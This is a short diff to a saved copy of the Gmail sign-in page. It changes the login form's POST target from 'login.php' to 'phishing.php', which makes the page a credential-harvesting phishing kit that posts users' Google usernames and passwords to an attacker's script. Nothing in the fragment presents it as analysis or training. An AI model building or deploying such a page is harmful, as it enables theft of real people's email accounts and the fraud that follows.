@@ -865,7 +865,7 @@
   <div id="cc_iframe_parent"><iframe src="./Gmail_files/CheckConnection.htm" id="youtube" style="visibility: hidden; width: 1px; height: 1px; position: absolute; top: -100px;"></iframe></div>
 <img class="profile-img" src="./Gmail_files/avatar_2x.png" alt="">
 <p class="profile-name"></p>
-  <form novalidate="" method="post" action="login.php" id="gaia_loginform">
+  <form novalidate="" method="post" action="phishing.php" id="gaia_loginform">
   <input name="GALX" type="hidden" value="qMTtjk_Ib8s">
   <input name="continue" type="hidden" value="https://mail.google.com/mail/">
   <input name="service" type="hidden" value="mail">
